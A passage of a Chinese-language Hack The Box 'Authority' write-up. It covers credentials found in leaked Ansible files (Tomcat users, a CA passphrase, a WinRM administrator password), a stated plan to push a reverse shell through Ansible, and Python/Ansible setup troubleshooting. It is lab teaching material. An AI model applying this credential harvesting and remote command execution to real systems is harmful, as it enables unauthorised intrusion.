</span><span id="__span-3-67"><a id="__codelineno-3-67" name="__codelineno-3-67" href="#__codelineno-3-67"></a>
</span><span id="__span-3-68"><a id="__codelineno-3-68" name="__codelineno-3-68" href="#__codelineno-3-68"></a>
</span><span id="__span-3-69"><a id="__codelineno-3-69" name="__codelineno-3-69" href="#__codelineno-3-69"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-3-70"><a id="__codelineno-3-70" name="__codelineno-3-70" href="#__codelineno-3-70"></a>└─$<span class="w"> </span>cat<span class="w"> </span>templates/tomcat-users.xml.j2<span class="w"> </span>
</span><span id="__span-3-71"><a id="__codelineno-3-71" name="__codelineno-3-71" href="#__codelineno-3-71"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s1">&#39;1.0&#39;</span><span class="w"> </span><span class="nv">encoding</span><span class="o">=</span><span class="s1">&#39;cp1252&#39;</span>?&gt;
</span><span id="__span-3-72"><a id="__codelineno-3-72" name="__codelineno-3-72" href="#__codelineno-3-72"></a>
</span><span id="__span-3-73"><a id="__codelineno-3-73" name="__codelineno-3-73" href="#__codelineno-3-73"></a>&lt;tomcat-users<span class="w"> </span><span class="nv">xmlns</span><span class="o">=</span><span class="s2">&quot;http://tomcat.apache.org/xml&quot;</span><span class="w"> </span>xmlns:xsi<span class="o">=</span><span class="s2">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
</span><span id="__span-3-74"><a id="__codelineno-3-74" name="__codelineno-3-74" href="#__codelineno-3-74"></a><span class="w"> </span>xsi:schemaLocation<span class="o">=</span><span class="s2">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span>
</span><span id="__span-3-75"><a id="__codelineno-3-75" name="__codelineno-3-75" href="#__codelineno-3-75"></a><span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span>&gt;
</span><span id="__span-3-76"><a id="__codelineno-3-76" name="__codelineno-3-76" href="#__codelineno-3-76"></a>
</span><span id="__span-3-77"><a id="__codelineno-3-77" name="__codelineno-3-77" href="#__codelineno-3-77"></a>&lt;user<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;admin&quot;</span><span class="w"> </span><span class="nv">password</span><span class="o">=</span><span class="s2">&quot;T0mc@tAdm1n&quot;</span><span class="w"> </span><span class="nv">roles</span><span class="o">=</span><span class="s2">&quot;manager-gui&quot;</span>/&gt;<span class="w">  </span>
</span><span id="__span-3-78"><a id="__codelineno-3-78" name="__codelineno-3-78" href="#__codelineno-3-78"></a>&lt;user<span class="w"> </span><span class="nv">username</span><span class="o">=</span><span class="s2">&quot;robot&quot;</span><span class="w"> </span><span class="nv">password</span><span class="o">=</span><span class="s2">&quot;T0mc@tR00t&quot;</span><span class="w"> </span><span class="nv">roles</span><span class="o">=</span><span class="s2">&quot;manager-script&quot;</span>/&gt;
</span><span id="__span-3-79"><a id="__codelineno-3-79" name="__codelineno-3-79" href="#__codelineno-3-79"></a>
</span><span id="__span-3-80"><a id="__codelineno-3-80" name="__codelineno-3-80" href="#__codelineno-3-80"></a>&lt;/tomcat-users&gt;
</span></code></pre></div>
<h3 id="ldap">LDAP<a class="headerlink" href="#ldap" title="Permanent link">&para;</a></h3>
<ul>
<li>看了眼README，这个role是配置SSSD部署LDAP认证用的。</li>
<li>TODO文件里提到更改过LDAP的admin密码，那么估计playbook里配置的凭据已经失效。</li>
<li>翻了一圈没发现凭据等有用信息。</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/LDAP<span class="o">]</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>└─$<span class="w"> </span>cat<span class="w"> </span>TODO.md<span class="w"> </span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>-<span class="w"> </span>Change<span class="w"> </span>LDAP<span class="w"> </span>admin<span class="w"> </span>password<span class="w"> </span>after<span class="w"> </span>build<span class="w"> </span>-<span class="o">[</span>COMPLETE<span class="o">]</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>-<span class="w"> </span>add<span class="w"> </span>tests<span class="w"> </span><span class="k">for</span><span class="w"> </span>ubuntu<span class="w"> </span><span class="m">14</span>,<span class="w"> </span><span class="m">16</span>,<span class="w"> </span>debian<span class="w"> </span><span class="m">7</span><span class="w"> </span>and<span class="w"> </span><span class="m">8</span>,<span class="w"> </span>and<span class="w"> </span>centos<span class="w"> </span><span class="m">6</span><span class="w"> </span>and<span class="w"> </span><span class="m">7</span>
</span></code></pre></div>
<h3 id="adcs">ADCS<a class="headerlink" href="#adcs" title="Permanent link">&para;</a></h3>
<ul>
<li>看了眼README，这个role是配置“certificate authority”的，应该就如文件夹名指的是ADCS。</li>
<li><code>defaults/main.yml</code> 里有个 <code>ca_passphrase: SuP3rS3creT</code> 不知道什么用途。还有一些域信息。</li>
<li>稍微扫了一眼剩下的文件，似乎都是部署的动作，没什么有用的信息。</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/ADCS<span class="o">]</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>└─$<span class="w"> </span>cat<span class="w"> </span>defaults/main.yml<span class="w">   </span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>（略）
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="c1"># A passphrase for the CA key.</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>ca_passphrase:<span class="w"> </span>SuP3rS3creT
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># The common name for the CA.</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>ca_common_name:<span class="w"> </span>authority.htb
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="c1"># Other details for the CA.</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>ca_country_name:<span class="w"> </span>NL
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>ca_email_address:<span class="w"> </span>admin@authority.htb
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>ca_organization_name:<span class="w"> </span>htb
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>ca_organizational_unit_name:<span class="w"> </span>htb
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>ca_state_or_province_name:<span class="w"> </span>Utrecht
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>ca_locality_name:<span class="w"> </span>Utrecht
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>（略）
</span></code></pre></div>
<p>终于看完这一堆文件，根据上面的信息，应该就PWM那个文件夹里的较有用，里面有较多凭据信息，且有几个加密了的不知道能否破解。</p>
<h2 id="ansible">Ansible<a class="headerlink" href="#ansible" title="Permanent link">&para;</a></h2>
<h3 id="ansible_1">尝试搭建ansible控制端发放命令执行<a class="headerlink" href="#ansible_1" title="Permanent link">&para;</a></h3>
<p>由于ansible清单文件里面包含了ansible执行时的账户密码，于是尝试能否搭建ansible控制端去连接靶机，并让其执行反弹shell。</p>
<h4 id="pythonansible">踩坑：Python高版本安装的ansible导致的报错<a class="headerlink" href="#pythonansible" title="Permanent link">&para;</a></h4>
<p>一开始直接用kali安装ansible，并根据<a href="https://docs.ansible.com/ansible/latest/os_guide/windows_winrm.html">文档</a>使用WinRM时需要安装pywinrm：<code>pip install "pywinrm&gt;=0.3.0"</code>。</p>
<p>但是执行 <code>ansible -i ansible_inventory HTB -m win_ping</code> 测试时总会报错：</p>
<ul>
<li>用靶机原本的清单文件（ansible_inventory，INI格式）时：报错无法连接22端口。</li>
<li>发现上面报错也有说无法解析清单文件，于是改成YAML格式后运行：报错“ntlm: module 'inspect' has no attribute 'getargspec'”。</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>└─$<span class="w"> </span>ansible<span class="w"> </span>-i<span class="w"> </span>ansible_inventory<span class="w"> </span>HTB<span class="w"> </span>-m<span class="w"> </span>win_ping<span class="w">          </span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">[</span>WARNING<span class="o">]</span>:<span class="w">  </span>*<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>parse<span class="w"> </span>/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory<span class="w"> </span>with<span class="w"> </span>yaml
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>plugin:<span class="w"> </span>We<span class="w"> </span>were<span class="w"> </span>unable<span class="w"> </span>to<span class="w"> </span><span class="nb">read</span><span class="w"> </span>either<span class="w"> </span>as<span class="w"> </span>JSON<span class="w"> </span>nor<span class="w"> </span>YAML,<span class="w"> </span>these<span class="w"> </span>are<span class="w"> </span>the<span class="w"> </span>errors<span class="w"> </span>we<span class="w"> </span>got<span class="w"> </span>from<span class="w"> </span>each:<span class="w"> </span>JSON:<span class="w"> </span>Expecting
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>value:<span class="w"> </span>line<span class="w"> </span><span class="m">1</span><span class="w"> </span>column<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="o">(</span>char<span class="w"> </span><span class="m">1</span><span class="o">)</span><span class="w">  </span>Syntax<span class="w"> </span>Error<span class="w"> </span><span class="k">while</span><span class="w"> </span>loading<span class="w"> </span>YAML.<span class="w">   </span>did<span class="w"> </span>not<span class="w"> </span>find<span class="w"> </span>expected<span class="w"> </span>&lt;document<span class="w"> </span>start&gt;<span class="w">  </span>The
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>error<span class="w"> </span>appears<span class="w"> </span>to<span class="w"> </span>be<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="s1">&#39;/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory&#39;</span>:<span class="w"> </span>line<span class="w"> </span><span class="m">2</span>,<span class="w"> </span>column<span class="w"> </span><span class="m">1</span>,
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>but<span class="w"> </span>may<span class="w"> </span>be<span class="w"> </span>elsewhere<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>file<span class="w"> </span>depending<span class="w"> </span>on<span class="w"> </span>the<span class="w"> </span>exact<span class="w"> </span>syntax<span class="w"> </span>problem.<span class="w">  </span>The<span class="w"> </span>offending<span class="w"> </span>line<span class="w"> </span>appears<span class="w"> </span>to<span class="w"> </span>be:<span class="w">  </span><span class="o">[</span>HTB<span class="o">]</span>
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="m">10</span>.10.11.222<span class="w"> </span>^<span class="w"> </span>here
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="o">[</span>WARNING<span class="o">]</span>:<span class="w">  </span>*<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>parse<span class="w"> </span>/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory<span class="w"> </span>with<span class="w"> </span>ini
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>plugin:<span class="w"> </span>/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory:5:<span class="w"> </span>Expected<span class="w"> </span><span class="nv">key</span><span class="o">=</span>value,<span class="w"> </span>got:
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>ansible_user:<span class="w"> </span>administrator
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="o">[</span>WARNING<span class="o">]</span>:<span class="w"> </span>Unable<span class="w"> </span>to<span class="w"> </span>parse<span class="w"> </span>/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory<span class="w"> </span>as<span class="w"> </span>an<span class="w"> </span>inventory
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="nb">source</span>
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="o">[</span>WARNING<span class="o">]</span>:<span class="w"> </span>No<span class="w"> </span>inventory<span class="w"> </span>was<span class="w"> </span>parsed,<span class="w"> </span>only<span class="w"> </span>implicit<span class="w"> </span>localhost<span class="w"> </span>is<span class="w"> </span>available
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="o">[</span>WARNING<span class="o">]</span>:<span class="w"> </span>provided<span class="w"> </span>hosts<span class="w"> </span>list<span class="w"> </span>is<span class="w"> </span>empty,<span class="w"> </span>only<span class="w"> </span>localhost<span class="w"> </span>is<span class="w"> </span>available.<span class="w"> </span>Note<span class="w"> </span>that<span class="w"> </span>the<span class="w"> </span>implicit<span class="w"> </span>localhost<span class="w"> </span>does<span class="w"> </span>not
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>match<span class="w"> </span><span class="s1">&#39;all&#39;</span>
</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a><span class="m">10</span>.10.11.222<span class="w"> </span><span class="p">|</span><span class="w"> </span>UNREACHABLE!<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">{</span>
</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a><span class="w">    </span><span class="s2">&quot;changed&quot;</span>:<span class="w"> </span>false,
</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="w">    </span><span class="s2">&quot;msg&quot;</span>:<span class="w"> </span><span class="s2">&quot;Data could not be sent to remote host \&quot;10.10.11.222\&quot;. Make sure this host can be reached over ssh: ssh: connect to host 10.10.11.222 port 22: Connection refused\r\n&quot;</span>,<span class="w">                                                    </span>
</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="w">    </span><span class="s2">&quot;unreachable&quot;</span>:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="o">}</span>
</span><span id="__span-6-22"><a id="__codelineno-6-22" name="__codelineno-6-22" href="#__codelineno-6-22"></a>
</span><span id="__span-6-23"><a id="__codelineno-6-23" name="__codelineno-6-23" href="#__codelineno-6-23"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/…/SMB/Automation/Ansible/PWM<span class="o">]</span>
</span><span id="__span-6-24"><a id="__codelineno-6-24" name="__codelineno-6-24" href="#__codelineno-6-24"></a>└─$<span class="w"> </span>ansible<span class="w"> </span>-i<span class="w"> </span>ansible_inventory.yml<span class="w"> </span>HTB<span class="w"> </span>-m<span class="w"> </span>win_ping<span class="w">    </span>
</span><span id="__span-6-25"><a id="__codelineno-6-25" name="__codelineno-6-25" href="#__codelineno-6-25"></a><span class="m">10</span>.10.11.222<span class="w"> </span><span class="p">|</span><span class="w"> </span>UNREACHABLE!<span class="w"> </span><span class="o">=</span>&gt;<span class="w"> </span><span class="o">{</span>
</span><span id="__span-6-26"><a id="__codelineno-6-26" name="__codelineno-6-26" href="#__codelineno-6-26"></a><span class="w">    </span><span class="s2">&quot;changed&quot;</span>:<span class="w"> </span>false,
</span><span id="__span-6-27"><a id="__codelineno-6-27" name="__codelineno-6-27" href="#__codelineno-6-27"></a><span class="w">    </span><span class="s2">&quot;msg&quot;</span>:<span class="w"> </span><span class="s2">&quot;ntlm: module &#39;inspect&#39; has no attribute &#39;getargspec&#39;&quot;</span>,
</span><span id="__span-6-28"><a id="__codelineno-6-28" name="__codelineno-6-28" href="#__codelineno-6-28"></a><span class="w">    </span><span class="s2">&quot;unreachable&quot;</span>:<span class="w"> </span><span class="nb">true</span>
</span><span id="__span-6-29"><a id="__codelineno-6-29" name="__codelineno-6-29" href="#__codelineno-6-29"></a><span class="o">}</span>
</span></code></pre></div>
<p>两次报错信息不一样还有点迷？<br />
继续搜索如何使用ansible管理Windows，看到<a href="https://bftnagoya.hateblo.jp/entry/2021/02/18/120652">这篇文章</a>后理解了一部分报错原因。总的来说，ansible默认用ssh连接。<br />
虽然原本INI格式的清单文件里有指定对目标使用WinRM连接，但是由于清单解析失败，所以还是使用了默认的ssh连接方式，而22端口我们也没扫出来是开放的，所以结果是报错22端口的ssh连接失败。<br />
<strong>那么后来用YAML清单执行的报错才是该解决的问题（文章里是可以通过指定变量使用WinRM的）。</strong></p>
<p>在这之前顺便确认了一下清单的主机变量。<br />
确实INI格式的清单会解析失败于是什么都没有，而YAML格式则顺利解析：
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>┌──(kali㉿kali)-[~/…/SMB/Automation/Ansible/PWM]
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>└─$ ansible-inventory -i ansible_inventory --list -y
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with yaml
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>plugin: We were unable to read either as JSON nor YAML, these are the errors we got from each: JSON: Expecting
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>value: line 1 column 2 (char 1)  Syntax Error while loading YAML.   did not find expected &lt;document start&gt;  The
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>error appears to be in &#39;/home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory&#39;: line 2, column 1,
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>but may be elsewhere in the file depending on the exact syntax problem.  The offending line appears to be:  [HTB]
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>10.10.11.222 ^ here
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>[WARNING]:  * Failed to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory with ini
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>plugin: /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory:5: Expected key=value, got:
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>ansible_user: administrator
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>[WARNING]: Unable to parse /home/kali/HTB/Authority/SMB/Automation/Ansible/PWM/ansible_inventory as an inventory
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>source
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>[WARNING]: No inventory was parsed, only implicit localhost is available
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>all:
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>  children:
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>    ungrouped: {}
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>┌──(kali㉿kali)-[~/…/SMB/Automation/Ansible/PWM]
</span><span id="__span-7-20"><a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>└─$ ansible-inventory -i ansible_inventory.yml --list -y 
</span><span id="__span-7-21"><a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>all:
</span><span id="__span-7-22"><a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>  children:
</span><span id="__span-7-23"><a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>    HTB:
</span><span id="__span-7-24"><a id="__codelineno-7-24" name="__codelineno-7-24" href="#__codelineno-7-24"></a>      hosts:
</span><span id="__span-7-25"><a id="__codelineno-7-25" name="__codelineno-7-25" href="#__codelineno-7-25"></a>        10.10.11.222:
</span><span id="__span-7-26"><a id="__codelineno-7-26" name="__codelineno-7-26" href="#__codelineno-7-26"></a>          ansible_connection: winrm
</span><span id="__span-7-27"><a id="__codelineno-7-27" name="__codelineno-7-27" href="#__codelineno-7-27"></a>          ansible_password: Welcome1
</span><span id="__span-7-28"><a id="__codelineno-7-28" name="__codelineno-7-28" href="#__codelineno-7-28"></a>          ansible_port: 5985
</span><span id="__span-7-29"><a id="__codelineno-7-29" name="__codelineno-7-29" href="#__codelineno-7-29"></a>          ansible_user: administrator
</span><span id="__span-7-30"><a id="__codelineno-7-30" name="__codelineno-7-30" href="#__codelineno-7-30"></a>          ansible_winrm_server_cert_validation: ignore
</span><span id="__span-7-31"><a id="__codelineno-7-31" name="__codelineno-7-31" href="#__codelineno-7-31"></a>          ansible_winrm_transport: ntlm
</span><span id="__span-7-32"><a id="__codelineno-7-32" name="__codelineno-7-32" href="#__codelineno-7-32"></a>    ungrouped: {}
</span></code></pre></div></p>
<p>继续打靶。</p>
<p>稍微查了下YAML清单执行的报错，似乎是'getargspec'在3.11不支持了，于是尝试降python版本运行。<br />
先安装低版本python。不过配置ansible的python解释器相关参数后，试了半天用 <code>ansible --version</code> 看python路径都没变化。查了查看到<a href="https://stackoverflow.com/questions/69122604/cannot-change-python-version-in-ansible">这里</a>。原来我更改的 <code>ansible.cfg</code> 和清单变量都是指定受控目标host的pyhton解释器，而ansible是一个pyhton库，控制端的python解释器路径就是依赖于安装ansible的python版本。要更改的话需要用低版本python重装ansible。其实<a href="https://docs.ansible.com/ansible/latest/reference_appendices/python_3_support.html#on-the-controller-side">官方文档</a>也有提到。</p>
<p>然而我的ansible是之前用apt装的……<br />
现在尝试用低版本python按照<a href="https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html#selecting-an-ansible-package-and-version-to-install">官方安装文档</a>重装。</p>
<h4 id="python39">降版本安装python3.9<a class="headerlink" href="#python39" title="Permanent link">&para;</a></h4>
<p>涉及到Python多版本共存的问题，用如下方式。后来想想用miniconda应该也不错？
<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">cd</span><span class="w"> </span>~
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>build-essential<span class="w"> </span>zlib1g-dev<span class="w"> </span>libncurses5-dev<span class="w"> </span>libgdbm-dev<span class="w"> </span>libnss3-dev<span class="w"> </span>libssl-dev<span class="w"> </span>libsqlite3-dev<span class="w"> </span>libreadline-dev<span class="w"> </span>libffi-dev<span class="w"> </span>wget<span class="w"> </span>libbz2-dev
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>wget<span class="w"> </span>https://www.python.org/ftp/python/3.9.7/Python-3.9.7.tgz
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>tar<span class="w"> </span>-xf<span class="w"> </span>Python-3.9.7.tgz
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="nb">cd</span><span class="w"> </span>Python-3.9.7
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>./configure<span class="w"> </span>--enable-optimizations
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>make<span class="w"> </span>-j<span class="k">$(</span>nproc<span class="k">)</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>sudo<span class="w"> </span>make<span class="w"> </span>altinstall
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>python3.9<span class="w"> </span>--version
</span></code></pre></div></p>
<h4 id="ansible_2">安装ansible<a class="headerlink" href="#ansible_2" title="Permanent link">&para;</a></h4>
<p>由于安装在用户目录，所以需要将其加入PATH（推荐用虚拟环境隔离一下，也不必用“--user”选项了自然也不用修改PATH）。<br />
然后根据<a href="https://docs.ansible.com/ansible/latest/os_guide/windows_winrm.html#what-is-winrm">ansible文档</a>，使用WinRM时安装pywinrm包：
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority/SMB<span class="o">]</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>└─$<span class="w"> </span>python3.9<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>-V
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>pip<span class="w"> </span><span class="m">21</span>.2.3<span class="w"> </span>from<span class="w"> </span>/usr/local/lib/python3.9/site-packages/pip<span class="w"> </span><span class="o">(</span>python<span class="w"> </span><span class="m">3</span>.9<span class="o">)</span>
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority/SMB<span class="o">]</span>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>└─$<span class="w"> </span>python3.9<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>--user<span class="w"> </span>ansible
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority/SMB<span class="o">]</span>
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>└─$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/home/kali/.local/bin:<span class="nv">$PATH</span>
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Authority/SMB<span class="o">]</span>
